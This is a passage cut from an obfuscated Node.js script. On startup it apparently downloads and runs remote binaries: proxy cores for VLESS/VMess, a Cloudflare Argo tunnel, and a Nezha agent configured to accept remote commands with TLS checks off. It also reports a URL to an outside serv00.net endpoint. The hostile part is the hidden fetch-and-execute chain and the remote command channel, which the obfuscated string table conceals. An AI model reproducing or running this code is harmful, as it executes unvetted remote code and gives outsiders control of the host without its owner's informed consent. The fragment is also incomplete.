=2560','all','UUID','&path=%2Fvless-argo%3Fed%3D2560#','\x20-c\x20\x22','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','constructor','tls','http','/vless-argo','vmess','{}.constructor(\x22return\x20this\x22)(\x20)','FILE_PATH','NEZHA_KEY','https://amd64.ssss.nyc.mn/bot','(((.+)+)+)+$','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','status','\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:','Download\x20','has','https://oooo.serv00.net/add-url','substring','get','sub.txt','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','vless','arm','amd','floor','createWriteStream','\x20-c\x20','npm\x20running\x20error:\x20','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','join','finish','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','utf-8','php\x20running\x20error:\x20','data'];_0x1ad4=function(){return _0x1b66c6;};return _0x1ad4();}async function startserver(){const _0x1ad790=_0x17b5fe;try{deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0xa65793){console['error'](_0x1ad790(0x165),_0xa65793);}}startserver()['catch'](_0x3ce7ca=>{const _0x878cc5=_0x17b5fe;console[_0x878cc5(0xab)](_0x878cc5(0xf6),_0x3ce7ca);}),app[_0x17b5fe(0x11a)](PORT,()=>console[_0x17b5fe(0x102)](_0x17b5fe(0x169)+PORT+'!'));
